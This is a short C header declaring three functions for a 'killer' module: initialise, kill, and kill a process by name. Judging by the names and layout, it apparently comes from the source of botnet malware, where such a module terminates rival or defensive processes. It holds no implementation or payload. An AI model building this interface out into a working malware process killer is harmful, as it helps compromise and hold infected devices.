#pragma once

#include <stdbool.h>
#include "includes.h"

void killer_init(void);
void killer_kill(void);
bool killer_kill_by_name(const char *name);
